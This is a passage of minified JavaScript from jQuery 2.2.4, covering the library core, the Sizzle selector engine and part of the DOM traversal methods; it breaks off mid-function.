if(function(t,e){"object"==typeof module&&"object"==typeof module.exports?module.exports=t.document?e(t,!0):function(t){if(!t.document)throw new Error("jQuery requires a window with a document");return e(t)}:e(t)}("undefined"!=typeof window?window:this,(function(t,e){var n=[],i=t.document,r=n.slice,o=n.concat,s=n.push,a=n.indexOf,l={},c=l.toString,u=l.hasOwnProperty,d={},h="2.2.4",f=function(t,e){return new f.fn.init(t,e)},p=/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,g=/^-ms-/,m=/-([\da-z])/gi,v=function(t,e){return e.toUpperCase()};function y(t){var e=!!t&&"length"in t&&t.length,n=f.type(t);return"function"!==n&&!f.isWindow(t)&&("array"===n||0===e||"number"==typeof e&&e>0&&e-1 in t)}f.fn=f.prototype={jquery:h,constructor:f,selector:"",length:0,toArray:function(){return r.call(this)},get:function(t){return null!=t?0>t?this[t+this.length]:this[t]:r.call(this)},pushStack:function(t){var e=f.merge(this.constructor(),t);return e.prevObject=this,e.context=this.context,e},each:function(t){return f.each(this,t)},map:function(t){return this.pushStack(f.map(this,(function(e,n){return t.call(e,n,e)})))},slice:function(){return this.pushStack(r.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(t){var e=this.length,n=+t+(0>t?e:0);return this.pushStack(n>=0&&e>n?[this[n]]:[])},end:function(){return this.prevObject||this.constructor()},push:s,sort:n.sort,splice:n.splice},f.extend=f.fn.extend=function(){var t,e,n,i,r,o,s=arguments[0]||{},a=1,l=arguments.length,c=!1;for("boolean"==typeof s&&(c=s,s=arguments[a]||{},a++),"object"==typeof s||f.isFunction(s)||(s={}),a===l&&(s=this,a--);l>a;a++)if(null!=(t=arguments[a]))for(e in t)n=s[e],s!==(i=t[e])&&(c&&i&&(f.isPlainObject(i)||(r=f.isArray(i)))?(r?(r=!1,o=n&&f.isArray(n)?n:[]):o=n&&f.isPlainObject(n)?n:{},s[e]=f.extend(c,o,i)):void 0!==i&&(s[e]=i));return s},f.extend({expando:"jQuery"+(h+Math.random()).replace(/\D/g,""),isReady:!0,error:function(t){throw new Error(t)},noop:function(){},isFunction:function(t){return"function"===f.type(t)},isArray:Array.isArray,isWindow:function(t){return null!=t&&t===t.window},isNumeric:function(t){var e=t&&t.toString();return!f.isArray(t)&&e-parseFloat(e)+1>=0},isPlainObject:function(t){var e;if("object"!==f.type(t)||t.nodeType||f.isWindow(t))return!1;if(t.constructor&&!u.call(t,"constructor")&&!u.call(t.constructor.prototype||{},"isPrototypeOf"))return!1;for(e in t);return void 0===e||u.call(t,e)},isEmptyObject:function(t){var e;for(e in t)return!1;return!0},type:function(t){return null==t?t+"":"object"==typeof t||"function"==typeof t?l[c.call(t)]||"object":typeof t},globalEval:function(t){var e,n=eval;(t=f.trim(t))&&(1===t.indexOf("use strict")?((e=i.createElement("script")).text=t,i.head.appendChild(e).parentNode.removeChild(e)):n(t))},camelCase:function(t){return t.replace(g,"ms-").replace(m,v)},nodeName:function(t,e){return t.nodeName&&t.nodeName.toLowerCase()===e.toLowerCase()},each:function(t,e){var n,i=0;if(y(t))for(n=t.length;n>i&&!1!==e.call(t[i],i,t[i]);i++);else for(i in t)if(!1===e.call(t[i],i,t[i]))break;return t},trim:function(t){return null==t?"":(t+"").replace(p,"")},makeArray:function(t,e){var n=e||[];return null!=t&&(y(Object(t))?f.merge(n,"string"==typeof t?[t]:t):s.call(n,t)),n},inArray:function(t,e,n){return null==e?-1:a.call(e,t,n)},merge:function(t,e){for(var n=+e.length,i=0,r=t.length;n>i;i++)t[r++]=e[i];return t.length=r,t},grep:function(t,e,n){for(var i=[],r=0,o=t.length,s=!n;o>r;r++)!e(t[r],r)!==s&&i.push(t[r]);return i},map:function(t,e,n){var i,r,s=0,a=[];if(y(t))for(i=t.length;i>s;s++)null!=(r=e(t[s],s,n))&&a.push(r);else for(s in t)null!=(r=e(t[s],s,n))&&a.push(r);return o.apply([],a)},guid:1,proxy:function(t,e){var n,i,o;return"string"==typeof e&&(n=t[e],e=t,t=n),f.isFunction(t)?(i=r.call(arguments,2),o=function(){return t.apply(e||this,i.concat(r.call(arguments)))},o.guid=t.guid=t.guid||f.guid++,o):void 0},now:Date.now,support:d}),"function"==typeof Symbol&&(f.fn[Symbol.iterator]=n[Symbol.iterator]),f.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "),(function(t,e){l["[object "+e+"]"]=e.toLowerCase()}));var b=function(t){var e,n,i,r,o,s,a,l,c,u,d,h,f,p,g,m,v,y,b,w="sizzle"+1*new Date,k=t.document,x=0,_=0,S=ot(),C=ot(),$=ot(),E=function(t,e){return t===e&&(d=!0),0},T=1<<31,L={}.hasOwnProperty,O=[],I=O.pop,A=O.push,P=O.push,N=O.slice,B=function(t,e){for(var n=0,i=t.length;i>n;n++)if(t[n]===e)return n;return-1},D="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",R="[\\x20\\t\\r\\n\\f]",j="(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",M="\\["+R+"*("+j+")(?:"+R+"*([*^$|!~]?=)"+R+"*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|("+j+"))|)"+R+"*\\]",F=":("+j+")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|"+M+")*)|.*)\\)|)",q=new RegExp(R+"+","g"),H=new RegExp("^"+R+"+|((?:^|[^\\\\])(?:\\\\.)*)"+R+"+$","g"),W=new RegExp("^"+R+"*,"+R+"*"),z=new RegExp("^"+R+"*([>+~]|"+R+")"+R+"*"),U=new RegExp("="+R+"*([^\\]'\"]*?)"+R+"*\\]","g"),Z=new RegExp(F),V=new RegExp("^"+j+"$"),K={ID:new RegExp("^#("+j+")"),CLASS:new RegExp("^\\.("+j+")"),TAG:new RegExp("^("+j+"|[*])"),ATTR:new RegExp("^"+M),PSEUDO:new RegExp("^"+F),CHILD:new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+R+"*(even|odd|(([+-]|)(\\d*)n|)"+R+"*(?:([+-]|)"+R+"*(\\d+)|))"+R+"*\\)|)","i"),bool:new RegExp("^(?:"+D+")$","i"),needsContext:new RegExp("^"+R+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+R+"*((?:-\\d)?\\d*)"+R+"*\\)|)(?=[^-]|$)","i")},X=/^(?:input|select|textarea|button)$/i,Y=/^h\d$/i,G=/^[^{]+\{\s*\[native \w/,Q=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,J=/[+~]/,tt=/'|\\/g,et=new RegExp("\\\\([\\da-f]{1,6}"+R+"?|("+R+")|.)","ig"),nt=function(t,e,n){var i="0x"+e-65536;return i!=i||n?e:0>i?String.fromCharCode(i+65536):String.fromCharCode(i>>10|55296,1023&i|56320)},it=function(){h()};try{P.apply(O=N.call(k.childNodes),k.childNodes),O[k.childNodes.length].nodeType}catch(t){P={apply:O.length?function(t,e){A.apply(t,N.call(e))}:function(t,e){for(var n=t.length,i=0;t[n++]=e[i++];);t.length=n-1}}}function rt(t,e,i,r){var o,a,c,u,d,p,v,y,x=e&&e.ownerDocument,_=e?e.nodeType:9;if(i=i||[],"string"!=typeof t||!t||1!==_&&9!==_&&11!==_)return i;if(!r&&((e?e.ownerDocument||e:k)!==f&&h(e),e=e||f,g)){if(11!==_&&(p=Q.exec(t)))if(o=p[1]){if(9===_){if(!(c=e.getElementById(o)))return i;if(c.id===o)return i.push(c),i}else if(x&&(c=x.getElementById(o))&&b(e,c)&&c.id===o)return i.push(c),i}else{if(p[2])return P.apply(i,e.getElementsByTagName(t)),i;if((o=p[3])&&n.getElementsByClassName&&e.getElementsByClassName)return P.apply(i,e.getElementsByClassName(o)),i}if(n.qsa&&!$[t+" "]&&(!m||!m.test(t))){if(1!==_)x=e,y=t;else if("object"!==e.nodeName.toLowerCase()){for((u=e.getAttribute("id"))?u=u.replace(tt,"\\$&"):e.setAttribute("id",u=w),a=(v=s(t)).length,d=V.test(u)?"#"+u:"[id='"+u+"']";a--;)v[a]=d+" "+gt(v[a]);y=v.join(","),x=J.test(t)&&ft(e.parentNode)||e}if(y)try{return P.apply(i,x.querySelectorAll(y)),i}catch(t){}finally{u===w&&e.removeAttribute("id")}}}return l(t.replace(H,"$1"),e,i,r)}function ot(){var t=[];return function e(n,r){return t.push(n+" ")>i.cacheLength&&delete e[t.shift()],e[n+" "]=r}}function st(t){return t[w]=!0,t}function at(t){var e=f.createElement("div");try{return!!t(e)}catch(t){return!1}finally{e.parentNode&&e.parentNode.removeChild(e),e=null}}function lt(t,e){for(var n=t.split("|"),r=n.length;r--;)i.attrHandle[n[r]]=e}function ct(t,e){var n=e&&t,i=n&&1===t.nodeType&&1===e.nodeType&&(~e.sourceIndex||T)-(~t.sourceIndex||T);if(i)return i;if(n)for(;n=n.nextSibling;)if(n===e)return-1;return t?1:-1}function ut(t){return function(e){return"input"===e.nodeName.toLowerCase()&&e.type===t}}function dt(t){return function(e){var n=e.nodeName.toLowerCase();return("input"===n||"button"===n)&&e.type===t}}function ht(t){return st((function(e){return e=+e,st((function(n,i){for(var r,o=t([],n.length,e),s=o.length;s--;)n[r=o[s]]&&(n[r]=!(i[r]=n[r]))}))}))}function ft(t){return t&&void 0!==t.getElementsByTagName&&t}for(e in n=rt.support={},o=rt.isXML=function(t){var e=t&&(t.ownerDocument||t).documentElement;return!!e&&"HTML"!==e.nodeName},h=rt.setDocument=function(t){var e,r,s=t?t.ownerDocument||t:k;return s!==f&&9===s.nodeType&&s.documentElement?(p=(f=s).documentElement,g=!o(f),(r=f.defaultView)&&r.top!==r&&(r.addEventListener?r.addEventListener("unload",it,!1):r.attachEvent&&r.attachEvent("onunload",it)),n.attributes=at((function(t){return t.className="i",!t.getAttribute("className")})),n.getElementsByTagName=at((function(t){return t.appendChild(f.createComment("")),!t.getElementsByTagName("*").length})),n.getElementsByClassName=G.test(f.getElementsByClassName),n.getById=at((function(t){return p.appendChild(t).id=w,!f.getElementsByName||!f.getElementsByName(w).length})),n.getById?(i.find.ID=function(t,e){if(void 0!==e.getElementById&&g){var n=e.getElementById(t);return n?[n]:[]}},i.filter.ID=function(t){var e=t.replace(et,nt);return function(t){return t.getAttribute("id")===e}}):(delete i.find.ID,i.filter.ID=function(t){var e=t.replace(et,nt);return function(t){var n=void 0!==t.getAttributeNode&&t.getAttributeNode("id");return n&&n.value===e}}),i.find.TAG=n.getElementsByTagName?function(t,e){return void 0!==e.getElementsByTagName?e.getElementsByTagName(t):n.qsa?e.querySelectorAll(t):void 0}:function(t,e){var n,i=[],r=0,o=e.getElementsByTagName(t);if("*"===t){for(;n=o[r++];)1===n.nodeType&&i.push(n);return i}return o},i.find.CLASS=n.getElementsByClassName&&function(t,e){return void 0!==e.getElementsByClassName&&g?e.getElementsByClassName(t):void 0},v=[],m=[],(n.qsa=G.test(f.querySelectorAll))&&(at((function(t){p.appendChild(t).innerHTML="<a id='"+w+"'></a><select id='"+w+"-\r\\' msallowcapture=''><option selected=''></option></select>",t.querySelectorAll("[msallowcapture^='']").length&&m.push("[*^$]="+R+"*(?:''|\"\")"),t.querySelectorAll("[selected]").length||m.push("\\["+R+"*(?:value|"+D+")"),t.querySelectorAll("[id~="+w+"-]").length||m.push("~="),t.querySelectorAll(":checked").length||m.push(":checked"),t.querySelectorAll("a#"+w+"+*").length||m.push(".#.+[+~]")})),at((function(t){var e=f.createElement("input");e.setAttribute("type","hidden"),t.appendChild(e).setAttribute("name","D"),t.querySelectorAll("[name=d]").length&&m.push("name"+R+"*[*^$|!~]?="),t.querySelectorAll(":enabled").length||m.push(":enabled",":disabled"),t.querySelectorAll("*,:x"),m.push(",.*:")}))),(n.matchesSelector=G.test(y=p.matches||p.webkitMatchesSelector||p.mozMatchesSelector||p.oMatchesSelector||p.msMatchesSelector))&&at((function(t){n.disconnectedMatch=y.call(t,"div"),y.call(t,"[s!='']:x"),v.push("!=",F)})),m=m.length&&new RegExp(m.join("|")),v=v.length&&new RegExp(v.join("|")),e=G.test(p.compareDocumentPosition),b=e||G.test(p.contains)?function(t,e){var n=9===t.nodeType?t.documentElement:t,i=e&&e.parentNode;return t===i||!(!i||1!==i.nodeType||!(n.contains?n.contains(i):t.compareDocumentPosition&&16&t.compareDocumentPosition(i)))}:function(t,e){if(e)for(;e=e.parentNode;)if(e===t)return!0;return!1},E=e?function(t,e){if(t===e)return d=!0,0;var i=!t.compareDocumentPosition-!e.compareDocumentPosition;return i||(1&(i=(t.ownerDocument||t)===(e.ownerDocument||e)?t.compareDocumentPosition(e):1)||!n.sortDetached&&e.compareDocumentPosition(t)===i?t===f||t.ownerDocument===k&&b(k,t)?-1:e===f||e.ownerDocument===k&&b(k,e)?1:u?B(u,t)-B(u,e):0:4&i?-1:1)}:function(t,e){if(t===e)return d=!0,0;var n,i=0,r=t.parentNode,o=e.parentNode,s=[t],a=[e];if(!r||!o)return t===f?-1:e===f?1:r?-1:o?1:u?B(u,t)-B(u,e):0;if(r===o)return ct(t,e);for(n=t;n=n.parentNode;)s.unshift(n);for(n=e;n=n.parentNode;)a.unshift(n);for(;s[i]===a[i];)i++;return i?ct(s[i],a[i]):s[i]===k?-1:a[i]===k?1:0},f):f},rt.matches=function(t,e){return rt(t,null,null,e)},rt.matchesSelector=function(t,e){if((t.ownerDocument||t)!==f&&h(t),e=e.replace(U,"='$1']"),n.matchesSelector&&g&&!$[e+" "]&&(!v||!v.test(e))&&(!m||!m.test(e)))try{var i=y.call(t,e);if(i||n.disconnectedMatch||t.document&&11!==t.document.nodeType)return i}catch(t){}return rt(e,f,null,[t]).length>0},rt.contains=function(t,e){return(t.ownerDocument||t)!==f&&h(t),b(t,e)},rt.attr=function(t,e){(t.ownerDocument||t)!==f&&h(t);var r=i.attrHandle[e.toLowerCase()],o=r&&L.call(i.attrHandle,e.toLowerCase())?r(t,e,!g):void 0;return void 0!==o?o:n.attributes||!g?t.getAttribute(e):(o=t.getAttributeNode(e))&&o.specified?o.value:null},rt.error=function(t){throw new Error("Syntax error, unrecognized expression: "+t)},rt.uniqueSort=function(t){var e,i=[],r=0,o=0;if(d=!n.detectDuplicates,u=!n.sortStable&&t.slice(0),t.sort(E),d){for(;e=t[o++];)e===t[o]&&(r=i.push(o));for(;r--;)t.splice(i[r],1)}return u=null,t},r=rt.getText=function(t){var e,n="",i=0,o=t.nodeType;if(o){if(1===o||9===o||11===o){if("string"==typeof t.textContent)return t.textContent;for(t=t.firstChild;t;t=t.nextSibling)n+=r(t)}else if(3===o||4===o)return t.nodeValue}else for(;e=t[i++];)n+=r(e);return n},i=rt.selectors={cacheLength:50,createPseudo:st,match:K,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(t){return t[1]=t[1].replace(et,nt),t[3]=(t[3]||t[4]||t[5]||"").replace(et,nt),"~="===t[2]&&(t[3]=" "+t[3]+" "),t.slice(0,4)},CHILD:function(t){return t[1]=t[1].toLowerCase(),"nth"===t[1].slice(0,3)?(t[3]||rt.error(t[0]),t[4]=+(t[4]?t[5]+(t[6]||1):2*("even"===t[3]||"odd"===t[3])),t[5]=+(t[7]+t[8]||"odd"===t[3])):t[3]&&rt.error(t[0]),t},PSEUDO:function(t){var e,n=!t[6]&&t[2];return K.CHILD.test(t[0])?null:(t[3]?t[2]=t[4]||t[5]||"":n&&Z.test(n)&&(e=s(n,!0))&&(e=n.indexOf(")",n.length-e)-n.length)&&(t[0]=t[0].slice(0,e),t[2]=n.slice(0,e)),t.slice(0,3))}},filter:{TAG:function(t){var e=t.replace(et,nt).toLowerCase();return"*"===t?function(){return!0}:function(t){return t.nodeName&&t.nodeName.toLowerCase()===e}},CLASS:function(t){var e=S[t+" "];return e||(e=new RegExp("(^|"+R+")"+t+"("+R+"|$)"))&&S(t,(function(t){return e.test("string"==typeof t.className&&t.className||void 0!==t.getAttribute&&t.getAttribute("class")||"")}))},ATTR:function(t,e,n){return function(i){var r=rt.attr(i,t);return null==r?"!="===e:!e||(r+="","="===e?r===n:"!="===e?r!==n:"^="===e?n&&0===r.indexOf(n):"*="===e?n&&r.indexOf(n)>-1:"$="===e?n&&r.slice(-n.length)===n:"~="===e?(" "+r.replace(q," ")+" ").indexOf(n)>-1:"|="===e&&(r===n||r.slice(0,n.length+1)===n+"-"))}},CHILD:function(t,e,n,i,r){var o="nth"!==t.slice(0,3),s="last"!==t.slice(-4),a="of-type"===e;return 1===i&&0===r?function(t){return!!t.parentNode}:function(e,n,l){var c,u,d,h,f,p,g=o!==s?"nextSibling":"previousSibling",m=e.parentNode,v=a&&e.nodeName.toLowerCase(),y=!l&&!a,b=!1;if(m){if(o){for(;g;){for(h=e;h=h[g];)if(a?h.nodeName.toLowerCase()===v:1===h.nodeType)return!1;p=g="only"===t&&!p&&"nextSibling"}return!0}if(p=[s?m.firstChild:m.lastChild],s&&y){for(b=(f=(c=(u=(d=(h=m)[w]||(h[w]={}))[h.uniqueID]||(d[h.uniqueID]={}))[t]||[])[0]===x&&c[1])&&c[2],h=f&&m.childNodes[f];h=++f&&h&&h[g]||(b=f=0)||p.pop();)if(1===h.nodeType&&++b&&h===e){u[t]=[x,f,b];break}}else if(y&&(b=f=(c=(u=(d=(h=e)[w]||(h[w]={}))[h.uniqueID]||(d[h.uniqueID]={}))[t]||[])[0]===x&&c[1]),!1===b)for(;(h=++f&&h&&h[g]||(b=f=0)||p.pop())&&((a?h.nodeName.toLowerCase()!==v:1!==h.nodeType)||!++b||(y&&((u=(d=h[w]||(h[w]={}))[h.uniqueID]||(d[h.uniqueID]={}))[t]=[x,b]),h!==e)););return(b-=r)===i||b%i==0&&b/i>=0}}},PSEUDO:function(t,e){var n,r=i.pseudos[t]||i.setFilters[t.toLowerCase()]||rt.error("unsupported pseudo: "+t);return r[w]?r(e):r.length>1?(n=[t,t,"",e],i.setFilters.hasOwnProperty(t.toLowerCase())?st((function(t,n){for(var i,o=r(t,e),s=o.length;s--;)t[i=B(t,o[s])]=!(n[i]=o[s])})):function(t){return r(t,0,n)}):r}},pseudos:{not:st((function(t){var e=[],n=[],i=a(t.replace(H,"$1"));return i[w]?st((function(t,e,n,r){for(var o,s=i(t,null,r,[]),a=t.length;a--;)(o=s[a])&&(t[a]=!(e[a]=o))})):function(t,r,o){return e[0]=t,i(e,null,o,n),e[0]=null,!n.pop()}})),has:st((function(t){return function(e){return rt(t,e).length>0}})),contains:st((function(t){return t=t.replace(et,nt),function(e){return(e.textContent||e.innerText||r(e)).indexOf(t)>-1}})),lang:st((function(t){return V.test(t||"")||rt.error("unsupported lang: "+t),t=t.replace(et,nt).toLowerCase(),function(e){var n;do{if(n=g?e.lang:e.getAttribute("xml:lang")||e.getAttribute("lang"))return(n=n.toLowerCase())===t||0===n.indexOf(t+"-")}while((e=e.parentNode)&&1===e.nodeType);return!1}})),target:function(e){var n=t.location&&t.location.hash;return n&&n.slice(1)===e.id},root:function(t){return t===p},focus:function(t){return t===f.activeElement&&(!f.hasFocus||f.hasFocus())&&!!(t.type||t.href||~t.tabIndex)},enabled:function(t){return!1===t.disabled},disabled:function(t){return!0===t.disabled},checked:function(t){var e=t.nodeName.toLowerCase();return"input"===e&&!!t.checked||"option"===e&&!!t.selected},selected:function(t){return t.parentNode&&t.parentNode.selectedIndex,!0===t.selected},empty:function(t){for(t=t.firstChild;t;t=t.nextSibling)if(t.nodeType<6)return!1;return!0},parent:function(t){return!i.pseudos.empty(t)},header:function(t){return Y.test(t.nodeName)},input:function(t){return X.test(t.nodeName)},button:function(t){var e=t.nodeName.toLowerCase();return"input"===e&&"button"===t.type||"button"===e},text:function(t){var e;return"input"===t.nodeName.toLowerCase()&&"text"===t.type&&(null==(e=t.getAttribute("type"))||"text"===e.toLowerCase())},first:ht((function(){return[0]})),last:ht((function(t,e){return[e-1]})),eq:ht((function(t,e,n){return[0>n?n+e:n]})),even:ht((function(t,e){for(var n=0;e>n;n+=2)t.push(n);return t})),odd:ht((function(t,e){for(var n=1;e>n;n+=2)t.push(n);return t})),lt:ht((function(t,e,n){for(var i=0>n?n+e:n;--i>=0;)t.push(i);return t})),gt:ht((function(t,e,n){for(var i=0>n?n+e:n;++i<e;)t.push(i);return t}))}},i.pseudos.nth=i.pseudos.eq,{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})i.pseudos[e]=ut(e);for(e in{submit:!0,reset:!0})i.pseudos[e]=dt(e);function pt(){}function gt(t){for(var e=0,n=t.length,i="";n>e;e++)i+=t[e].value;return i}function mt(t,e,n){var i=e.dir,r=n&&"parentNode"===i,o=_++;return e.first?function(e,n,o){for(;e=e[i];)if(1===e.nodeType||r)return t(e,n,o)}:function(e,n,s){var a,l,c,u=[x,o];if(s){for(;e=e[i];)if((1===e.nodeType||r)&&t(e,n,s))return!0}else for(;e=e[i];)if(1===e.nodeType||r){if((a=(l=(c=e[w]||(e[w]={}))[e.uniqueID]||(c[e.uniqueID]={}))[i])&&a[0]===x&&a[1]===o)return u[2]=a[2];if(l[i]=u,u[2]=t(e,n,s))return!0}}}function vt(t){return t.length>1?function(e,n,i){for(var r=t.length;r--;)if(!t[r](e,n,i))return!1;return!0}:t[0]}function yt(t,e,n,i,r){for(var o,s=[],a=0,l=t.length,c=null!=e;l>a;a++)(o=t[a])&&(n&&!n(o,i,r)||(s.push(o),c&&e.push(a)));return s}function bt(t,e,n,i,r,o){return i&&!i[w]&&(i=bt(i)),r&&!r[w]&&(r=bt(r,o)),st((function(o,s,a,l){var c,u,d,h=[],f=[],p=s.length,g=o||function(t,e,n){for(var i=0,r=e.length;r>i;i++)rt(t,e[i],n);return n}(e||"*",a.nodeType?[a]:a,[]),m=!t||!o&&e?g:yt(g,h,t,a,l),v=n?r||(o?t:p||i)?[]:s:m;if(n&&n(m,v,a,l),i)for(c=yt(v,f),i(c,[],a,l),u=c.length;u--;)(d=c[u])&&(v[f[u]]=!(m[f[u]]=d));if(o){if(r||t){if(r){for(c=[],u=v.length;u--;)(d=v[u])&&c.push(m[u]=d);r(null,v=[],c,l)}for(u=v.length;u--;)(d=v[u])&&(c=r?B(o,d):h[u])>-1&&(o[c]=!(s[c]=d))}}else v=yt(v===s?v.splice(p,v.length):v),r?r(null,s,v,l):P.apply(s,v)}))}function wt(t){for(var e,n,r,o=t.length,s=i.relative[t[0].type],a=s||i.relative[" "],l=s?1:0,u=mt((function(t){return t===e}),a,!0),d=mt((function(t){return B(e,t)>-1}),a,!0),h=[function(t,n,i){var r=!s&&(i||n!==c)||((e=n).nodeType?u(t,n,i):d(t,n,i));return e=null,r}];o>l;l++)if(n=i.relative[t[l].type])h=[mt(vt(h),n)];else{if((n=i.filter[t[l].type].apply(null,t[l].matches))[w]){for(r=++l;o>r&&!i.relative[t[r].type];r++);return bt(l>1&&vt(h),l>1&&gt(t.slice(0,l-1).concat({value:" "===t[l-2].type?"*":""})).replace(H,"$1"),n,r>l&&wt(t.slice(l,r)),o>r&&wt(t=t.slice(r)),o>r&&gt(t))}h.push(n)}return vt(h)}function kt(t,e){var n=e.length>0,r=t.length>0,o=function(o,s,a,l,u){var d,p,m,v=0,y="0",b=o&&[],w=[],k=c,_=o||r&&i.find.TAG("*",u),S=x+=null==k?1:Math.random()||.1,C=_.length;for(u&&(c=s===f||s||u);y!==C&&null!=(d=_[y]);y++){if(r&&d){for(p=0,s||d.ownerDocument===f||(h(d),a=!g);m=t[p++];)if(m(d,s||f,a)){l.push(d);break}u&&(x=S)}n&&((d=!m&&d)&&v--,o&&b.push(d))}if(v+=y,n&&y!==v){for(p=0;m=e[p++];)m(b,w,s,a);if(o){if(v>0)for(;y--;)b[y]||w[y]||(w[y]=I.call(l));w=yt(w)}P.apply(l,w),u&&!o&&w.length>0&&v+e.length>1&&rt.uniqueSort(l)}return u&&(x=S,c=k),b};return n?st(o):o}return pt.prototype=i.filters=i.pseudos,i.setFilters=new pt,s=rt.tokenize=function(t,e){var n,r,o,s,a,l,c,u=C[t+" "];if(u)return e?0:u.slice(0);for(a=t,l=[],c=i.preFilter;a;){for(s in n&&!(r=W.exec(a))||(r&&(a=a.slice(r[0].length)||a),l.push(o=[])),n=!1,(r=z.exec(a))&&(n=r.shift(),o.push({value:n,type:r[0].replace(H," ")}),a=a.slice(n.length)),i.filter)!(r=K[s].exec(a))||c[s]&&!(r=c[s](r))||(n=r.shift(),o.push({value:n,type:s,matches:r}),a=a.slice(n.length));if(!n)break}return e?a.length:a?rt.error(t):C(t,l).slice(0)},a=rt.compile=function(t,e){var n,i=[],r=[],o=$[t+" "];if(!o){for(e||(e=s(t)),n=e.length;n--;)(o=wt(e[n]))[w]?i.push(o):r.push(o);(o=$(t,kt(r,i))).selector=t}return o},l=rt.select=function(t,e,r,o){var l,c,u,d,h,f="function"==typeof t&&t,p=!o&&s(t=f.selector||t);if(r=r||[],1===p.length){if((c=p[0]=p[0].slice(0)).length>2&&"ID"===(u=c[0]).type&&n.getById&&9===e.nodeType&&g&&i.relative[c[1].type]){if(!(e=(i.find.ID(u.matches[0].replace(et,nt),e)||[])[0]))return r;f&&(e=e.parentNode),t=t.slice(c.shift().value.length)}for(l=K.needsContext.test(t)?0:c.length;l--&&(u=c[l],!i.relative[d=u.type]);)if((h=i.find[d])&&(o=h(u.matches[0].replace(et,nt),J.test(c[0].type)&&ft(e.parentNode)||e))){if(c.splice(l,1),!(t=o.length&&gt(c)))return P.apply(r,o),r;break}}return(f||a(t,p))(o,e,!g,r,!e||J.test(t)&&ft(e.parentNode)||e),r},n.sortStable=w.split("").sort(E).join("")===w,n.detectDuplicates=!!d,h(),n.sortDetached=at((function(t){return 1&t.compareDocumentPosition(f.createElement("div"))})),at((function(t){return t.innerHTML="<a href='#'></a>","#"===t.firstChild.getAttribute("href")}))||lt("type|href|height|width",(function(t,e,n){return n?void 0:t.getAttribute(e,"type"===e.toLowerCase()?1:2)})),n.attributes&&at((function(t){return t.innerHTML="<input/>",t.firstChild.setAttribute("value",""),""===t.firstChild.getAttribute("value")}))||lt("value",(function(t,e,n){return n||"input"!==t.nodeName.toLowerCase()?void 0:t.defaultValue})),at((function(t){return null==t.getAttribute("disabled")}))||lt(D,(function(t,e,n){var i;return n?void 0:!0===t[e]?e.toLowerCase():(i=t.getAttributeNode(e))&&i.specified?i.value:null})),rt}(t);f.find=b,f.expr=b.selectors,f.expr[":"]=f.expr.pseudos,f.uniqueSort=f.unique=b.uniqueSort,f.text=b.getText,f.isXMLDoc=b.isXML,f.contains=b.contains;var w=function(t,e,n){for(var i=[],r=void 0!==n;(t=t[e])&&9!==t.nodeType;)if(1===t.nodeType){if(r&&f(t).is(n))break;i.push(t)}return i},k=function(t,e){for(var n=[];t;t=t.nextSibling)1===t.nodeType&&t!==e&&n.push(t);return n},x=f.expr.match.needsContext,_=/^<([\w-]+)\s*\/?>(?:<\/\1>|)$/,S=/^.[^:#\[\.,]*$/;function C(t,e,n){if(f.isFunction(e))return f.grep(t,(function(t,i){return!!e.call(t,i,t)!==n}));if(e.nodeType)return f.grep(t,(function(t){return t===e!==n}));if("string"==typeof e){if(S.test(e))return f.filter(e,t,n);e=f.filter(e,t)}return f.grep(t,(function(t){return a.call(e,t)>-1!==n}))}f.filter=function(t,e,n){var i=e[0];return n&&(t=":not("+t+")"),1===e.length&&1===i.nodeType?f.find.matchesSelector(i,t)?[i]:[]:f.find.matches(t,f.grep(e,(function(t){return 1===t.nodeType})))},f.fn.extend({find:function(t){var e,n=this.length,i=[],r=this;if("string"!=typeof t)return this.pushStack(f(t).filter((function(){for(e=0;n>e;e++)if(f.contains(r[e],this))return!0})));for(e=0;n>e;e++)f.find(t,r[e],i);return(i=this.pushStack(n>1?f.unique(i):i)).selector=this.selector?this.selector+" "+t:t,i},filter:function(t){return this.pushStack(C(this,t||[],!1))},not:function(t){return this.pushStack(C(this,t||[],!0))},is:function(t){return!!C(this,"string"==typeof t&&x.test(t)?f(t):t||[],!1).length}});var $,E=/^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/,T=f.fn.init=function(t,e,n){var r,o;if(!t)return this;if(n=n||$,"string"==typeof t){if(!(r="<"===t[0]&&">"===t[t.length-1]&&t.length>=3?[null,t,null]:E.exec(t))||!r[1]&&e)return!e||e.jquery?(e||n).find(t):this.constructor(e).find(t);if(r[1]){if(e=e instanceof f?e[0]:e,f.merge(this,f.parseHTML(r[1],e&&e.nodeType?e.ownerDocument||e:i,!0)),_.test(r[1])&&f.isPlainObject(e))for(r in e)f.isFunction(this[r])?this[r](e[r]):this.attr(r,e[r]);return this}return(o=i.getElementById(r[2]))&&o.parentNode&&(this.length=1,this[0]=o),this.context=i,this.selector=t,this}return t.nodeType?(this.context=this[0]=t,this.length=1,this):f.isFunction(t)?void 0!==n.ready?n.ready(t):t(f):(void 0!==t.selector&&(this.selector=t.selector,this.context=t.context),f.makeArray(t,this))};T.prototype=f.fn,$=f(i);var L=/^(?:parents|prev(?:Until|All))/,O={children:!0,contents:!0,next:!0,prev:!0};function I(t,e){for(;(t=t[e])&&1!==t.nodeType;);return t}f.fn.extend({has:function(t){var e=f(t,this),n=e.length;return this.filter((function(){for(var t=0;n>t;t++)if(f.contains(this,e[t]))return!0}))},closest:function(t,e){for(var n,i=0,r=this.length,o=[],s=x.test(t)||"string"!=typeof t?f(t,e||this.context):0;r>i;i++)for(n=this[i];n&&n!==e;n=n.parentNode)if(n.nodeType<11&&(s?s.index(n)>-1:1===n.nodeType&&f.find.matchesSelector(n,t))){o.push(n);break}return 